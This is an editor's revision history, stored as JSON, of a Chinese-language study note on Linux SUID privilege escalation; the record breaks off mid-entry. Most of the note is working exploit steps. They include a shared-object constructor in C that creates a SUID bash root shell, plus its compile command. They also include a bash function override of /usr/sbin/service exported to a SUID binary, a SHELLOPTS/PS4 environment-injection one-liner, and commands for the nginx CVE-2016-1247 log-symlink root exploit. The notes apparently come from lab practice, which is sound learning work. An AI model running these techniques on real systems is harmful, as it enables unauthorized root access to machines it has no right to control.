{"compress":true,"commitItems":[["211da2bc-837a-4c4d-88ea-f3a9ed842357",1596639361083,"",[[1596639303123,["whale@Whale",[[1,0,"suid\n===\n\n\n"]],[0,0],[11,11]]],[1596639308481,["whale@Whale",[[-1,10,"\n"],[1,11,"## g"]],[11,11],[14,14]]],[1596639309061,["whale@Whale",[[-1,13,"g"]],[14,14],[13,13]]],[1596639313936,["whale@Whale",[[1,13,"shared object"]],[13,13],[26,26]]],[1596803150673,["whale@Whale",[[1,26,"\n\n"]],[26,26],[27,27]]],[1596803150905,["whale@Whale",[[1,28,"\n"]],[27,27],[28,28]]],[1596803154437,["whale@Whale",[[-1,28,"\n"],[1,29,"## symli"]],[28,28],[36,36]]],[1596803154705,["whale@Whale",[[1,36,"k"]],[36,36],[37,37]]],[1596803155077,["whale@Whale",[[1,37,"\n\n"]],[37,37],[38,38]]],[1596803155284,["whale@Whale",[[1,39,"\n"]],[38,38],[39,39]]],[1596803157055,["whale@Whale",[[-1,39,"\n"],[1,40,"## huan"]],[39,39],[46,46]]],[1596803157852,["whale@Whale",[[-1,42,"huan"]],[46,46],[42,42]]],[1596803161594,["whale@Whale",[[1,42,"环境变量"]],[42,42],[46,46]]],[1596803162846,["whale@Whale",[[1,46,"\n\n"]],[46,46],[47,47]]],[1596899404317,["whale@Whale",[[1,4,"文件权限"]],[4,4],[8,8]]],[1596899404542,["whale@Whale",[[1,9,"\n"]],[8,8],[9,9]]],[1596899405183,["whale@Whale",[[-1,9,"\n"]],[9,9],[8,8]]],[1596899775511,["whale@Whale",[[1,30,"注入"]],[30,30],[32,32]]],[1596899954520,["whale@Whale",[[1,33,"find / -type f -perm -04000 -ls 2>/dev/null"]],[33,33],[76,76]]],[1596900319717,["whale@Whale",[[1,77,"\n"]],[76,76],[77,77]]],[1596900320468,["whale@Whale",[[1,77,"strace /usr/local/bin/suid-so 2>&1 | grep -i -E \"open|access|no such file\""]],[77,77],[151,151]]],[1596900321196,["whale@Whale",[[1,152,"\n"]],[151,151],[152,152]]],[1596900476749,["whale@Whale",[[1,152,"rm ./'--checkpoint=1'"]],[152,152],[173,173]]],[1596900477336,["whale@Whale",[[1,174,"\n"]],[173,173],[174,174]]],[1596900481413,["whale@Whale",[[-1,152,"rm ./'--checkpoint=1'\n"]],[152,174],[152,152]]],[1596900489749,["whale@Whale",[[1,152,"mkdir /home/user/.config"]],[152,152],[176,176]]],[1596900490315,["whale@Whale",[[1,177,"\n"]],[176,176],[177,177]]],[1596901078882,["whale@Whale",[[1,178,"\n"]],[177,177],[178,178]]],[1596901079841,["whale@Whale",[[1,178,"#include <stdio.h> #include <stdlib.h> static void inject() __attribute__((constructor)); void inject() { system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\"); }"]],[178,178],[357,357]]],[1596901080328,["whale@Whale",[[1,358,"\n"]],[357,357],[358,358]]],[1596901083923,["whale@Whale",[[1,197,"\n"]],[197,197],[198,198]]],[1596901107964,["whale@Whale",[[1,218,"\n"]],[218,218],[219,219]]],[1596901114311,["whale@Whale",[[1,270,"\n"]],[270,270],[271,271]]],[1596901121494,["whale@Whale",[[1,284,"\n"]],[284,284],[285,285]]],[1596901126639,["whale@Whale",[[1,285,"、"]],[285,285],[286,286]]],[1596901127314,["whale@Whale",[[-1,285,"、"]],[286,286],[285,285]]],[1596901127695,["whale@Whale",[[-1,284,"\n"]],[285,285],[284,284]]],[1596901130300,["whale@Whale",[[1,287,"\n"]],[287,287],[288,288]]],[1596901133385,["whale@Whale",[[1,360,"\n"]],[360,360],[361,361]]],[1596901585775,["whale@Whale",[[1,177,"vi libcalc.so"]],[177,177],[190,190]]],[1596901586396,["whale@Whale",[[1,191,"\n"]],[190,190],[191,191]]],[1596901587223,["whale@Whale",[[1,192,"\n"]],[191,191],[192,192]]],[1596901709208,["whale@Whale",[[1,379,"\n"]],[378,378],[379,379]]],[1596901727292,["whale@Whale",[[1,379,"gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c"]],[379,379],[458,458]]],[1596901732875,["whale@Whale",[[-1,188,"so"]],[188,190],[188,188]]],[1596901734411,["whale@Whale",[[1,188,"c"]],[188,188],[189,189]]],[1596902007743,["whale@Whale",[[1,458,"\n"]],[457,457],[458,458]]],[1596902008522,["whale@Whale",[[1,459,"\n"]],[458,458],[459,459]]],[1596902023689,["whale@Whale",[[1,459,"/usr/local/bin/suid-so"]],[459,459],[481,481]]],[1596902024190,["whale@Whale",[[1,482,"\n"]],[481,481],[482,482]]],[1596902026761,["whale@Whale",[[1,482,"yua"]],[482,482],[485,485]]],[1596902027418,["whale@Whale",[[-1,482,"yua"]],[485,485],[482,482]]],[1596902029063,["whale@Whale",[[1,482,"原理："]],[482,482],[485,485]]],[1596902029340,["whale@Whale",[[1,486,"\n"]],[485,485],[486,486]]],[1596902076960,["whale@Whale",[[1,485,"某些程序运行时候，有着管理员权限，却可以被任何用户调用，这就是suid权限。"]],[485,485],[523,523]]],[1596902077398,["whale@Whale",[[1,525,"\n"]],[523,523],[524,524]]],[1596902096478,["whale@Whale",[[1,524,"如果这个suid程序调用了某些shared obje"]],[524,524],[550,550]]],[1596902116956,["whale@Whale",[[1,550,"ct，可以通过伪造shared object，来提权"]],[550,550],[576,576]]],[1596902119504,["whale@Whale",[[-1,574,"提权"]],[576,576],[574,574]]],[1596902149766,["whale@Whale",[[1,574,"伪造命令。以该程序的root权限，去执行"]],[574,574],[594,594]]],[1596902150117,["whale@Whale",[[1,596,"\n"]],[594,594],[595,595]]],[1596902152231,["whale@Whale",[[1,595,"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p,"]],[595,595],[656,656]]],[1596902152945,["whale@Whale",[[-1,655,","]],[656,656],[655,655]]],[1596902160049,["whale@Whale",[[1,594,"tiq"]],[594,594],[597,597]]],[1596902160694,["whale@Whale",[[-1,594,"tiq"]],[597,597],[594,594]]],[1596902163864,["whale@Whale",[[1,594,"提权命令。"]],[594,594],[599,599]]],[1596902167310,["whale@Whale",[[1,600,"`"]],[600,600],[601,601]]],[1596902168821,["whale@Whale",[[1,661,"`"]],[661,661],[662,662]]],[1596902169932,["whale@Whale",[[1,664,"\n"]],[662,662],[663,663]]],[1596902782431,["whale@Whale",[[1,665,"\n"]],[663,663],[664,664]]],[1596902782771,["whale@Whale",[[1,664,"z"]],[664,664],[665,665]]],[1596902783202,["whale@Whale",[[-1,664,"z"]],[665,665],[664,664]]],[1596902798286,["whale@Whale",[[1,664,"注意，suid权限必须是二进制程序，脚本程序是"]],[664,664],[687,687]]],[1596902799112,["whale@Whale",[[-1,686,"是"]],[687,687],[686,686]]],[1596902805707,["whale@Whale",[[1,686,"是无效的，"]],[686,686],[691,691]]],[1596902808374,["whale@Whale",[[-1,690,"，"]],[691,691],[690,690]]],[1596902808605,["whale@Whale",[[1,690,"。"]],[690,690],[691,691]]],[1596902812991,["whale@Whale",[[1,681,"才能用"]],[681,681],[684,684]]],[1596902952420,["whale@Whale",[[1,695,"概念：动态链接与静态链接的区别"]],[695,695],[710,710]]],[1596902953610,["whale@Whale",[[1,711,"\n"]],[710,710],[711,711]]],[1596902957997,["whale@Whale",[[1,711,"\t\t dll与"]],[711,711],[718,718]]],[1596902963353,["whale@Whale",[[1,714,"。"]],[714,714],[715,715]]],[1596902963981,["whale@Whale",[[-1,714,"。"]],[715,715],[714,714]]],[1596902964343,["whale@Whale",[[1,714,"."]],[714,714],[715,715]]],[1596902969948,["whale@Whale",[[1,719,".so的区别"]],[719,719],[725,725]]],[1596903305492,["whale@Whale",[[1,13,"。"]],[13,13],[14,14]]],[1596903306025,["whale@Whale",[[-1,13,"。"]],[14,14],[13,13]]],[1596903306787,["whale@Whale",[[1,13,".so"]],[13,13],[16,16]]],[1596903310142,["whale@Whale",[[-1,13,".so"]],[16,16],[13,13]]],[1596903312321,["whale@Whale",[[1,13,"txt"]],[13,13],[16,16]]],[1596903312855,["whale@Whale",[[1,17,"\n"]],[16,16],[17,17]]],[1596903314762,["whale@Whale",[[1,17,"html"]],[17,17],[21,21]]],[1596903316685,["whale@Whale",[[1,17,"."]],[17,17],[18,18]]],[1596903318351,["whale@Whale",[[1,13,"."]],[13,13],[14,14]]],[1596903320642,["whale@Whale",[[1,24,"\n"]],[23,23],[24,24]]],[1596903350872,["whale@Whale",[[-1,13,".txt\n.html"]],[13,23],[13,13]]],[1596903352269,["whale@Whale",[[-1,14,"\n"]],[13,13],[13,13]]],[1596903723586,["whale@Whale",[[1,726,"\n"]],[725,725],[726,726]]],[1596903725470,["whale@Whale",[[1,726,"c"]],[726,726],[727,727]]],[1596903725873,["whale@Whale",[[-1,726,"c"]],[727,727],[726,726]]],[1596903737268,["whale@Whale",[[1,726,"编译语言编程基础"]],[726,726],[734,734]]],[1596903737676,["whale@Whale",[[1,735,"\n"]],[734,734],[735,735]]],[1596903738249,["whale@Whale",[[-1,735,"\n"]],[735,735],[734,734]]],[1596903738478,["whale@Whale",[[1,734,"‘"]],[734,734],[735,735]]],[1596903739040,["whale@Whale",[[-1,734,"‘"]],[735,735],[734,734]]],[1596903739974,["whale@Whale",[[1,734,"'"]],[734,734],[735,735]]],[1596903740527,["whale@Whale",[[-1,734,"'"]],[735,735],[734,734]]],[1596903744641,["whale@Whale",[[1,734,"，linux命令"]],[734,734],[742,742]]],[1596903749116,["whale@Whale",[[1,735,"熟悉"]],[735,735],[737,737]]],[1596977974975,["whale@Whale",[[1,765,"\n"]],[763,763],[764,764]]],[1596977975700,["whale@Whale",[[1,764,"find / -type f -perm -04000 -ls 2>/dev/null"]],[764,764],[807,807]]],[1596977976174,["whale@Whale",[[1,809,"\n"]],[807,807],[808,808]]],[1596977981065,["whale@Whale",[[1,808,"#"]],[808,808],[809,809]]],[1596977983175,["whale@Whale",[[-1,808,"#"]],[809,809],[808,808]]],[1596977984451,["whale@Whale",[[1,808,"//"]],[808,808],[810,810]]],[1596977985058,["whale@Whale",[[-1,808,"//"]],[810,810],[808,808]]],[1596977986451,["whale@Whale",[[1,808,"//"]],[808,808],[810,810]]],[1596978222232,["whale@Whale",[[1,812,"\n"]],[810,810],[811,811]]],[1596978222405,["whale@Whale",[[1,813,"\n"]],[811,811],[812,812]]],[1596978223077,["whale@Whale",[[1,812,"function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }"]],[812,812],[901,901]]],[1596978223756,["whale@Whale",[[1,903,"\n"]],[901,901],[902,902]]],[1596978223994,["whale@Whale",[[1,904,"\n"]],[902,902],[903,903]]],[1596978238605,["whale@Whale",[[1,903,"export -f /usr/sbin/service"]],[903,903],[930,930]]],[1596978254659,["whale@Whale",[[1,932,"\n"]],[930,930],[931,931]]],[1596978255290,["whale@Whale",[[1,931,"/usr/local/bin/suid-env2"]],[931,931],[955,955]]],[1596978568589,["whale@Whale",[[1,754,"——符号链接（）"]],[754,754],[762,762]]],[1596978572804,["whale@Whale",[[-1,760,"（）"]],[762,762],[760,760]]],[1596980669749,["whale@Whale",[[1,816,"查看有suid权限的程序"]],[816,816],[828,828]]],[1596980772889,["whale@Whale",[[1,830,"\n"]],[829,829],[830,830]]],[1596980773431,["whale@Whale",[[1,830,"strings /usr/local/bin/suid-env"]],[830,830],[861,861]]],[1596980773879,["whale@Whale",[[1,862,"\n"]],[861,861],[862,862]]],[1596980780859,["whale@Whale",[[1,862,"//查看二进制文件使用的函数"]],[862,862],[876,876]]],[1596980780987,["whale@Whale",[[1,877,"\n"]],[876,876],[877,877]]],[1596980781193,["whale@Whale",[[1,878,"\n"]],[877,877],[878,878]]],[1596981004162,["whale@Whale",[[1,879,"\n"]],[877,877],[878,878]]],[1596981007882,["whale@Whale",[[1,878,"fi"]],[878,878],[880,880]]],[1596981008636,["whale@Whale",[[-1,878,"fi"]],[880,880],[878,878]]],[1596981012949,["whale@Whale",[[1,878,"whereis service"]],[878,878],[893,893]]],[1596981013455,["whale@Whale",[[1,895,"\n"]],[893,893],[894,894]]],[1596981015649,["whale@Whale",[[1,894,"查看"]],[894,894],[896,896]]],[1596981016811,["whale@Whale",[[-1,894,"查看"]],[896,896],[894,894]]],[1596981029846,["whale@Whale",[[1,894,"//查看service的路径"]],[894,894],[908,908]]],[1596981030311,["whale@Whale",[[1,910,"\n"]],[908,908],[909,909]]],[1596981030508,["whale@Whale",[[1,911,"\n"]],[909,909],[910,910]]],[1596981102908,["whale@Whale",[[1,910,"function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }"]],[910,910],[999,999]]],[1596981120210,["whale@Whale",[[1,1001,"\n"]],[999,999],[1000,1000]]],[1596981120392,["whale@Whale",[[1,1002,"\n"]],[1000,1000],[1001,1001]]],[1596981121075,["whale@Whale",[[1,1001,"export -f /usr/sbin/service"]],[1001,1001],[1028,1028]]],[1596981121575,["whale@Whale",[[1,1030,"\n"]],[1028,1028],[1029,1029]]],[1596981121852,["whale@Whale",[[1,1031,"\n"]],[1029,1029],[1030,1030]]],[1596981131048,["whale@Whale",[[1,1030,"/usr/local/bin/suid-env2"]],[1030,1030],[1054,1054]]],[1596981132332,["whale@Whale",[[1,1056,"\n"]],[1054,1054],[1055,1055]]],[1596981132952,["whale@Whale",[[1,1057,"\n"]],[1055,1055],[1056,1056]]],[1596981514516,["whale@Whale",[[1,1058,"\n"]],[1055,1055],[1056,1056]]],[1596981515373,["whale@Whale",[[1,1056,"env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'"]],[1056,1056],[1217,1217]]],[1596981516042,["whale@Whale",[[1,1220,"\n"]],[1217,1217],[1218,1218]]],[1596981516336,["whale@Whale",[[1,1221,"\n"]],[1218,1218],[1219,1219]]],[1596981973143,["whale@Whale",[[1,13,"## 引子"]],[13,13],[18,18]]],[1596981973496,["whale@Whale",[[1,19,"\n"]],[18,18],[19,19]]],[1596981978559,["whale@Whale",[[1,19,"当我开始做"]],[19,19],[24,24]]],[1596981979916,["whale@Whale",[[-1,23,"做"]],[24,24],[23,23]]],[1596981996488,["whale@Whale",[[1,23,"想做成一件事的时候，我慢慢的开始不再问活着的意思"]],[23,23],[47,47]]],[1596981997048,["whale@Whale",[[-1,45,"意思"]],[47,47],[45,45]]],[1596981998605,["whale@Whale",[[1,45,"意义是"]],[45,45],[48,48]]],[1596982008592,["whale@Whale",[[1,50,"诸如此类的问题了。"]],[50,50],[59,59]]],[1596982009341,["whale@Whale",[[1,60,"\n"]],[59,59],[60,60]]],[1596982012420,["whale@Whale",[[1,60,"——"]],[60,60],[62,62]]],[1596982015625,["whale@Whale",[[1,60,"···"]],[60,60],[63,63]]],[1596982016754,["whale@Whale",[[-1,60,"···"]],[63,63],[60,60]]],[1596982019953,["whale@Whale",[[1,60,"\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t"]],[60,60],[86,86]]],[1596982023635,["whale@Whale",[[1,88,"by whale"]],[88,88],[96,96]]],[1596982029985,["whale@Whale",[[1,42,"\""]],[42,42],[43,43]]],[1596982032545,["whale@Whale",[[1,51,"“"]],[51,51],[52,52]]],[1596982035123,["whale@Whale",[[-1,51,"“"]],[52,52],[51,51]]],[1596982035935,["whale@Whale",[[1,51,"”"]],[51,51],[52,52]]],[1596982037900,["whale@Whale",[[-1,51,"”"]],[52,52],[51,51]]],[1596982038919,["whale@Whale",[[1,51,"“"]],[51,51],[52,52]]],[1596982040135,["whale@Whale",[[-1,51,"“"]],[52,52],[51,51]]],[1596982043439,["whale@Whale",[[1,51,"”\""]],[51,51],[53,53]]],[1596982045468,["whale@Whale",[[-1,51,"”"]],[52,52],[51,51]]],[1596985420281,[null,[[-1,49,"\n#"],[1,51,"什么"],[-1,61,"#"],[1,62,"\n"],[1,99,"##"]],[49,49],[101,101]]],[1596985420281,[null,[[1,49,"\n#"],[-1,49,"什么"],[1,61,"#"],[-1,61,"\n"],[-1,99,"##"]],[101,101],[49,49]]],[1596985414099,["whale@Whale",[[1,995,"\n"]],[994,994],[995,995]]],[1596985418472,["whale@Whale",[[1,995,"## 方法一："]],[995,995],[1002,1002]]],[1596985480234,[null,[[-1,49,"\n#"],[1,51,"什么"],[-1,61,"#"],[1,62,"\n"],[1,99,"##"],[-1,993,"fu"],[1,1003,"fu"]],[49,49],[1005,1005]]],[1596985480235,[null,[[1,49,"\n#"],[-1,49,"什么"],[1,61,"#"],[-1,61,"\n"],[-1,99,"##"],[1,995,"fu"],[-1,1003,"fu"]],[1005,1005],[49,49]]],[1596985421527,["whale@Whale",[[-1,1314,"\n"]],[1314,1314],[1313,1313]]],[1596985421733,["whale@Whale",[[-1,1313,"\n"]],[1313,1313],[1312,1312]]],[1596985428680,["whale@Whale",[[1,1312,"## 方法二："]],[1312,1312],[1319,1319]]],[1596985430785,["whale@Whale",[[1,997,"#"]],[995,995],[996,996]]],[1596985434158,["whale@Whale",[[1,1315,"#"]],[1313,1313],[1314,1314]]]]],["8f0b0913-6d5b-4a35-9ca8-2bd3866c423a",1597500620678,"suid文件权限\n===\n## 引子\n当我开始想做成一件事的时候，我慢慢的开始不再问\"活着的意义是什么\"诸如此类的问题了。\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t——by whale\n## shared object注入\nfind / -type f -perm -04000 -ls 2>/dev/null\nstrace /usr/local/bin/suid-so 2>&1 | grep -i -E \"open|access|no such file\"\nmkdir /home/user/.config\nvi libcalc.c\n\n\n#include <stdio.h> \n#include <stdlib.h> \nstatic void inject() __attribute__((constructor)); \nvoid inject() { \nsystem(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\"); \n}\n\ngcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c\n\n/usr/local/bin/suid-so\n原理：某些程序运行时候，有着管理员权限，却可以被任何用户调用，这就是suid权限。\n如果这个suid程序调用了某些shared object，可以通过伪造shared object，来伪造命令。以该程序的root权限，去执行提权命令。\n`cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p`\n\n注意，suid权限必须是二进制程序才能用，脚本程序是无效的。\n概念：动态链接与静态链接的区别\n\t\t .dll与.so的区别\n编译语言编程基础，熟悉linux命令\n## symlik——符号链接\n\n## 环境变量\nfind / -type f -perm -04000 -ls 2>/dev/null\n//查看有suid权限的程序\n\nstrings /usr/local/bin/suid-env\n//查看二进制文件使用的函数\n\nwhereis service\n//查看service的路径\n\n### 方法一：\nfunction /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }\n\nexport -f /usr/sbin/service\n\n/usr/local/bin/suid-env2\n\nenv -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'\n\n### 方法二：\nfunction /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }\n\nexport -f /usr/sbin/service\n/usr/local/bin/suid-env2\n\n",[[1597500614342,["whale@Whale",[[1,19,"\n"]],[18,18],[19,19]]],[1597500619093,["whale@Whale",[[1,19,"一个具有独立"]],[19,19],[25,25]]],[1597500626325,["whale@Whale",[[1,25,"思考能力的人是可贵的。"]],[25,25],[36,36]]],[1597500627141,["whale@Whale",[[1,37,"\n"]],[36,36],[37,37]]],[1597501318660,["whale@Whale",[[1,865,"发现"]],[865,865],[867,867]]],[1597501319080,["whale@Whale",[[1,868,"\n"]],[867,867],[868,868]]],[1597501320458,["whale@Whale",[[1,868,"利用"]],[868,868],[870,870]]],[1597501327310,["whale@Whale",[[1,865,"### "]],[865,865],[869,869]]],[1597501331516,["whale@Whale",[[1,872,"### "]],[872,872],[876,876]]],[1597501333459,["whale@Whale",[[1,872,"\n"]],[871,871],[872,872]]],[1597501970952,["whale@Whale",[[1,872,"dpkg -l | grep nginx"]],[872,872],[892,892]]],[1597501971471,["whale@Whale",[[1,893,"\n"]],[892,892],[893,893]]],[1597502168649,["whale@Whale",[[1,896,"su -l www-data"]],[896,896],[910,910]]],[1597502170092,["whale@Whale",[[-1,896,"su -l www-data"]],[910,910],[896,896]]],[1597502171807,["whale@Whale",[[1,893,"su -l www-data"]],[893,893],[907,907]]],[1597502172373,["whale@Whale",[[1,908,"\n"]],[907,907],[908,908]]],[1597502246137,["whale@Whale",[[1,908,"/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log"]],[908,908],[971,971]]],[1597502246830,["whale@Whale",[[1,972,"\n"]],[971,971],[972,972]]],[1597503219411,["whale@Whale",[[1,865,"\n"]],[864,864],[865,865]]],[1597503223865,["whale@Whale",[[-1,865,"\n"]],[865,865],[864,864]]],[1597591460290,["whale@Whale",[[1,865,"\n"]],[864,864],[865,865]]],[1597591462278,["whale@Whale",[[1,865,"x"]],[865,865],[866,866]]],[1597591462900,["whale@Whale",[[-1,865,"x"]],[866,866],[865,865]]],[1597591506840,["whale@Whale",[[1,865,"需要www-data权限，nginx版本在1.6.2-5+deb8u3版本以下。"]],[865,865],[905,905]]],[1597591507338,["whale@Whale",[[1,906,"\n"]],[905,905],[906,906]]],[1597592067795,["whale@Whale",[[1,1642,"\n"]],[1641,1641],[1642,1642]]],[1597592071978,["whale@Whale",[[-1,1642,"\n"],[1,1643,"## 参考资料"]],[1642,1642],[1649,1649]]],[1597592072950,["whale@Whale",[[1,1649,"\n\n[https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)\n"]],[1649,1649],[1825,1825]]],[1597593734652,[null,[[-1,1650,"\n"],[1,1826,"\n"]],[1650,1650],[1827,1827]]],[1597593734653,[null,[[1,1650,"\n"],[-1,1825,"\n"]],[1827,1827],[1650,1650]]],[1597593704512,["whale@Whale",[[1,1022,"\n"]],[1021,1021],[1022,1022]]],[1597593707375,["whale@Whale",[[1,1022,"invoke-rc.d nginx rotate >/dev/null 2>&1"]],[1022,1022],[1062,1062]]],[1597593710557,["whale@Whale",[[-1,950,"/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log\n"]],[950,1014],[950,950]]],[1597593711547,["whale@Whale",[[1,958,"\n"]],[957,957],[958,958]]],[1597593712854,["whale@Whale",[[1,958,"/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log\n"]],[958,958],[1022,1022]]],[1597593794657,[null,[[-1,1692,"\n"],[1,1868,"\n"]],[1692,1692],[1869,1869]]],[1597593794657,[null,[[1,1692,"\n"],[-1,1867,"\n"]],[1869,1869],[1692,1692]]],[1597593768279,["whale@Whale",[[1,1867,"[https://camo.githubusercontent.com/acb487594dbe457b6711a0a70eb545ec828159a8/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067](https://camo.githubusercontent.com/acb487594dbe457b6711a0a70eb545ec828159a8/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067)"]],[1867,1867],[2211,2211]]],[1597593854658,[null,[[-1,1692,"\n"],[1,1867,"\n"]],[1692,1692],[1868,1868]]],[1597593854658,[null,[[1,1692,"\n"],[-1,1866,"\n"]],[1868,1868],[1692,1692]]],[1597593844436,["whale@Whale",[[1,1692,"- "]],[1692,1692],[1694,1694]]],[1597593846742,["whale@Whale",[[1,1869,"- "]],[1869,1869],[1871,1871]]],[1597593847982,["whale@Whale",[[-1,1869,"- "]],[1871,1871],[1869,1869]]],[1597593849100,["whale@Whale",[[1,1869,"- "]],[1869,1869],[1871,1871]]],[1597593851646,["whale@Whale",[[1,2216,"\n"]],[2215,2215],[2216,2216]]],[1597593853517,["whale@Whale",[[-1,2216,"\n"],[1,2217,"- [https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/](https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/)"]],[2216,2216],[2424,2424]]],[1597593864982,[null,[[-1,1694,"\n"],[1,1869,"\n"]],[1694,1694],[1870,1870]]],[1597593864982,[null,[[1,1694,"\n"],[-1,1868,"\n"]],[1870,1870],[1694,1694]]],[1597593857294,["whale@Whale",[[-1,1869,"- "]],[1871,1871],[1869,1869]]],[1597593861265,["whale@Whale",[[1,1869,"-     "]],[1869,1869],[1875,1875]]]]],["fedbf88d-cb50-4593-b32f-881f87ba9053",1598013813162,"suid文件权限\n===\n## 引子\n一个具有独立思考能力的人是可贵的。\n\n当我开始想做成一件事的时候，我慢慢的开始不再问\"活着的意义是什么\"诸如此类的问题了。\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t——by whale\n## shared object注入\nfind / -type f -perm -04000 -ls 2>/dev/null\nstrace /usr/local/bin/suid-so 2>&1 | grep -i -E \"open|access|no such file\"\nmkdir /home/user/.config\nvi libcalc.c\n\n\n#include <stdio.h> \n#include <stdlib.h> \nstatic void inject() __attribute__((constructor)); \nvoid inject() { \nsystem(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\"); \n}\n\ngcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c\n\n/usr/local/bin/suid-so\n原理：某些程序运行时候，有着管理员权限，却可以被任何用户调用，这就是suid权限。\n如果这个suid程序调用了某些shared object，可以通过伪造shared object，来伪造命令。以该程序的root权限，去执行提权命令。\n`cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p`\n\n注意，suid权限必须是二进制程序才能用，脚本程序是无效的。\n概念：动态链接与静态链接的区别\n\t\t .dll与.so的区别\n编译语言编程基础，熟悉linux命令\n## symlik——符号链接\n需要www-data权限，nginx版本在1.6.2-5+deb8u3版本以下。\n\n### 发现\ndpkg -l | grep nginx\nsu -l www-data\n\n### 利用\n/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log\n\ninvoke-rc.d nginx rotate >/dev/null 2>&1\n## 环境变量\nfind / -type f -perm -04000 -ls 2>/dev/null\n//查看有suid权限的程序\n\nstrings /usr/local/bin/suid-env\n//查看二进制文件使用的函数\n\nwhereis service\n//查看service的路径\n\n### 方法一：\nfunction /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }\n\nexport -f /usr/sbin/service\n\n/usr/local/bin/suid-env2\n\nenv -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'\n\n### 方法二：\nfunction /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }\n\nexport -f /usr/sbin/service\n/usr/local/bin/suid-env2\n\n## 参考资料\n- [https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)\n-     [https://camo.githubusercontent.com/acb487594dbe457b6711a0a70eb545ec828159a8/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067](https://camo.githubusercontent.com/acb487594dbe457b6711a0a70eb545ec828159a8/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067)\n- [https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/](https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/)",[[1598013772625,["whale@Whale",[[-1,38,"当我开始想做成一件事的时候，我慢慢的开始不再问\"活着的意义是什么\"诸如此类的问题了。\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t——by whale"]],[38,117],[38,38]]],[1598013774174,["whale@Whale",[[-1,38,"\n"]],[38,38],[37,37]]],[1598023396686,["whale@Whale",[[1,57,"\n"]],[56,56],[57,57]]],[1598023397555,["whale@Whale",[[1,57,"·"]],[57,57],[58,58]]],[1598023398286,["whale@Whale",[[-1,57,"·"]],[58,58],[57,57]]],[1598023400445,["whale@Whale",[[1,57,"·"]],[57,57],[58,58]]],[1598023401329,["whale@Whale",[[-1,57,"·"]],[58,58],[57,57]]],[1598023403168,["whale@Whale",[[1,57,"```"]],[57,57],[60,60]]],[1598023408084,["whale@Whale",[[1,510,"\n"]],[509,509],[510,510]]],[1598023408802,["whale@Whale",[[1,510,"```"]],[510,510],[513,513]]],[1598023417168,["whale@Whale",[[1,1149,"\n"]],[1148,1148],[1149,1149]]],[1598023418855,["whale@Whale",[[1,1149,"```"]],[1149,1149],[1152,1152]]],[1598023421210,["whale@Whale",[[1,1461,"```"]],[1461,1461],[1464,1464]]],[1598023423521,["whale@Whale",[[1,1474,"\n"]],[1473,1473],[1474,1474]]],[1598023424242,["whale@Whale",[[1,1474,"```"]],[1474,1474],[1477,1477]]],[1598023426021,["whale@Whale",[[1,1622,"```"]],[1622,1622],[1625,1625]]],[1598024136731,["whale@Whale",[[1,1149,"\n"]],[1148,1148],[1149,1149]]],[1598024137416,["whale@Whale",[[1,1149,"s"]],[1149,1149],[1150,1150]]],[1598024137944,["whale@Whale",[[-1,1149,"s"]],[1150,1150],[1149,1149]]],[1598024146002,["whale@Whale",[[1,1149,"首先了解一下export命令"]],[1149,1149],[1163,1163]]],[1598024146332,["whale@Whale",[[1,1164,"\n"]],[1163,1163],[11